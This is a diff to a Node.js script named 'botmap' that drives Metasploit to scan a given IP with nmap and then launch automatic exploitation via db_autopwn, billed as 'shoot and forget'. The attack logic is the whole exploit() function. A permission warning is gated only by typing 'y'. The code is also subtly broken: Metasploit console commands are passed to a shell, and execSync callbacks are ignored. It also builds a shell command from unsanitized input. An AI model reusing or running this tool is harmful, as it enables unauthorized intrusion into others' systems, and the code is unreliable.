@@ -1,4 +1,4 @@
-#! usr/bin/env nodejs
+#! /usr/bin/env nodejs
 import fs from 'fs'
 import { execSync } from 'child_process'
 import c from 'colors/safe'
@@ -23,18 +23,19 @@ function userAuth() {
  console.warn(c.warn("Note,that you need the permission of the target's owner !"))
  console.warn(c.warn('Are you sure you want to scan and attack: \n' + target))
  console.log(c.prompt('Press y to continue'))
-let input = p.prompt()
+let input = p()
 
 if (input != 'y') {
   console.log(info('Maybe a wise decision..'))
   process.exit(1)
-}
+  }
 }
 
 //perform exploit
 function exploit(target) {
  console.log(c.info('Starting ...'))
  console.warn(c.warn('Once again... I hope you now what you are doing...'))
+
   //start postgresql
  execSync('service postgresql start', (err, stdout, stderr) => {
    if (err || stderr) {
@@ -45,6 +46,7 @@ function exploit(target) {
     console.log(c.info('started postgresql'))
    }
   })
+
   //start msf
  execSync('msfconsole', (err, stdout, stderr) => {
   if (err || stderr) {
@@ -55,6 +57,8 @@ function exploit(target) {
    console.log(c.info('started msf'))
   }
  })
+
+ //switch workspace
  execSync('workspace botmap', (err, stdout, stderr) => {
   if (err || stderr) {
    let error = err || stderr
@@ -65,6 +69,8 @@ function exploit(target) {
    console.log(c.info('switched workspace'))
   }
  })
+
+ //performing scan
  console.log(c.info('Starting scan...'))
  execSync('db_nmap -sS -sV -sU -n -O ' + target, (err, stdout, stderr) => {
   if (err || stderr) {
@@ -75,6 +81,8 @@ function exploit(target) {
    console.log(c.info('scan finished'))
   }
  })
+
+ //host list
  execSync('db_hosts', (err, stdout, stderr) => {
   if (err || stderr) {
    let error = err || stderr
@@ -84,6 +92,8 @@ function exploit(target) {
    console.log(c.info('HOST:' + stdout))
   }
  })
+
+ //pawning...
  console.warn(c.warn('Note that the following action can bring you to jail ! \n Botmap can not stop the action once it started !'))
  execSync('db_autopwn -p -t -e', (err, stdout, stderr) => {
   if (err || stderr) {
@@ -95,7 +105,6 @@ function exploit(target) {
   }
  })
 }
-
 
 
 
@@ -170,7 +179,7 @@ if (userArgs[0] == 'target' || userArgs[0] == '-t') {
   //botmap help | botmap -h
  console.log(c.help('------------------------------------------'))
  console.log(c.help('botmap [command] [argument] where: '))
- console.log(c.help('command is one of the following\n target [traget ip]: set target, shoot and forget \n about : display the info about botmap \n clean : to clean the temp.json \n help to display this menu '))
+ console.log(c.help('command is one of the following\n target [traget ip]: set target, shoot and forget \n about : display the info about botmap  \n help to display this menu '))
  console.log(c.help('------------------------------------------'))
 } else if (userArgs[0] == 'setup') {
   //botmap setup
